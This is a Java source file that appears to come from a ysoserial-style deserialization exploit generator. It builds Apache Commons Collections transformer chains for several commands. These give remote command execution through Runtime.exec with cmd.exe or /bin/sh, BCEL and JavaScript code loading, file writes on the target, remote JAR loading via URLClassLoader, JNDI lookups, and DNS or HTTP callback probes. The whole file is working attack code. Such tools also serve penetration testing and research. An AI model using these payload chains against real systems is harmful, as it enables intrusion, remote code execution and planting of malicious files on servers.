package yso.payloads.custom;

import me.gv7.woodpecker.bcel.HackBCELs;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import sun.misc.BASE64Decoder;
import yso.payloads.util.CommonUtil;

import java.io.FileOutputStream;
import java.net.URL;

public class CommonsCollectionsUtil {
    public static Transformer[] getTransformerList(String command) throws Exception {
        Transformer[] transformers = null;
        if(command.toLowerCase().startsWith(CustomCommand.COMMAND_SLEEP)){
            int time = Integer.valueOf(command.substring(CustomCommand.COMMAND_SLEEP.length())) * 1000;
            transformers = new Transformer[]{
                new ConstantTransformer(Thread.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"sleep", new Class[]{long.class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{(long)time}}),
                new ConstantTransformer(1)
            };
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_DNSLOG)){
            String dnslogDomain = command.substring(CustomCommand.COMMAND_DNSLOG.length());
            //java.net.InetAddress.getAllByName("dnslog");
            transformers = new Transformer[]{
                new ConstantTransformer(java.net.InetAddress.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getAllByName",new Class[]{String.class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,new Object[]{dnslogDomain}}),
                new ConstantTransformer(1)
            };
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_HTTPLOG)){
            //new java.net.URL("http://xxx").getContent();
            //java.net.URL.class.getConstructor(new Class[]{String.class}).newInstance(new Object[]{httplogURL}).getContent();
            String httplogURL = command.substring(CustomCommand.COMMAND_HTTPLOG.length());
            transformers = new Transformer[]{
                new ConstantTransformer(URL.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{httplogURL}}),
                new InvokerTransformer("getContent", new Class[0], new Object[0]),
                new ConstantTransformer(1)
            };
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_RAW_CMD)){
            String cmd = command.substring(CustomCommand.COMMAND_RAW_CMD.length());
            transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{cmd}),
                new ConstantTransformer(1) };
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_WIN_CMD)){
            String cmd = command.substring(CustomCommand.COMMAND_RAW_CMD.length());
            transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String[].class }, new Object[]{new String[]{"cmd.exe","/c",cmd}}),
                new ConstantTransformer(1) };
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_LINUX_CMD)){
            String cmd = command.substring(CustomCommand.COMMAND_LINUX_CMD.length());
            transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String[].class }, new Object[]{new String[]{"/bin/sh","-c",cmd}}),
                new ConstantTransformer(1) };
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL)) {
            String bcelStr = command.substring(CustomCommand.COMMAND_BCEL.length());
            Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
            transformers = new Transformer[]{
                new ConstantTransformer(bcelClazz),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                new InvokerTransformer("newInstance", new Class[0], new Object[0]),
                new ConstantTransformer(1)
            };
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE)) {
            String bcelClass = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE.length());
            byte[] byteCode = CommonUtil.getFileBytes(bcelClass);
            String bcelStr = HackBCELs.encode(byteCode);
            Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
            transformers = new Transformer[]{
                new ConstantTransformer(bcelClazz),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                new InvokerTransformer("newInstance", new Class[0], new Object[0]),
                new ConstantTransformer(1)
            };
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_WITH_ARGS)){
            String tmp = command.substring(CustomCommand.COMMAND_BCEL_WITH_ARGS.length());
            String bcelStr = tmp.split("\\|")[0] ;
            String bcelArgs = tmp.split("\\|")[1];
            Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
            transformers = new Transformer[]{
                new ConstantTransformer(bcelClazz),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{bcelArgs}}),
                new ConstantTransformer(1)
            };
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS)){
            String tmp = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS.length());
            String bcelStr = HackBCELs.encode(tmp.split("\\|")[0]);
            String bcelArgs = tmp.split("\\|")[1];
            Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
            transformers = new Transformer[]{
                new ConstantTransformer(bcelClazz),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{bcelArgs}}),
                new ConstantTransformer(1)
            };
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_FILE)){
            // new javax.script.ScriptEngineManager().getEngineByName("js").eval("script_code");
            String scriptFilePath = command.substring(CustomCommand.COMMAND_SCRIPT_FILE.length());
            String scriptContent = new String(CommonUtil.readFileByte(scriptFilePath));
            transformers = new Transformer[]{
                new ConstantTransformer(javax.script.ScriptEngineManager.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("getEngineByName", new Class[] {String.class}, new Object[] {"js"}),
                new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{scriptContent}),
                new ConstantTransformer(1)
            };
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_BASE64)){
            String scriptContent = command.substring(CustomCommand.COMMAND_SCRIPT_BASE64.length());
            scriptContent = new String(new BASE64Decoder().decodeBuffer(scriptContent));
            transformers = new Transformer[]{
                new ConstantTransformer(javax.script.ScriptEngineManager.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("getEngineByName", new Class[] {String.class}, new Object[] {"js"}),
                new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{scriptContent}),
                new ConstantTransformer(1)
            };
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_UPLOAD_BASE64)){
            String tmp = command.substring(CustomCommand.COMMAND_UPLOAD_BASE64.length());
            String remoteFilePath = tmp.split("\\|")[0] ;
            String fileBase64Content = tmp.split("\\|")[1];
            byte[] fileContent = new BASE64Decoder().decodeBuffer(fileBase64Content);
            transformers = new Transformer[]{
                new ConstantTransformer(FileOutputStream.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{remoteFilePath}}),
                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{fileContent}),
                new ConstantTransformer(1)
            };
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_UPLOADFILE)){
            String tmp = command.substring(CustomCommand.COMMAND_UPLOADFILE.length());
            String localFilePath = tmp.split("\\|")[0];
            String remoteFilePath = tmp.split("\\|")[1] ;
            byte[] fileContent = CommonUtil.getFileBytes(localFilePath);
            transformers = new Transformer[]{
                new ConstantTransformer(FileOutputStream.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{remoteFilePath}}),
                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{fileContent}),
                new ConstantTransformer(1)
            };
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_LOADJAR)){
            String tmp = command.substring(CustomCommand.COMMAND_LOADJAR.length());
            String jarPath = tmp.split("\\|")[0];
            String className = tmp.split("\\|")[1];
            transformers = new Transformer[]{
                new ConstantTransformer(java.net.URLClassLoader.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(jarPath)}}}),
                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                new InvokerTransformer("newInstance",new Class[0],new Object[0]),
                new ConstantTransformer(1)
            };
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_LOADJAR_WITH_ARGS)) {
            String tmp = command.substring(CustomCommand.COMMAND_LOADJAR_WITH_ARGS.length());
            String jarPath = tmp.split("\\|")[0];
            String className = tmp.split("\\|")[1];
            String args = tmp.split("\\|")[2];
            transformers = new Transformer[]{
                new ConstantTransformer(java.net.URLClassLoader.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(jarPath)}}}),
                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance",new Class[]{Object[].class},new Object[]{new Object[]{args}}),
                new ConstantTransformer(1)
            };
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)){
            String jndiURL = command.substring(CustomCommand.COMMAND_JNDI.length());
            //new javax.naming.InitialContext().lookup("");
            transformers = new Transformer[]{
                new ConstantTransformer(javax.naming.InitialContext.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{jndiURL}),
                new ConstantTransformer(1)
            };
        }else {
            throw new Exception(String.format("Command [%s] not supported",command));
        }
        return transformers;
    }
}
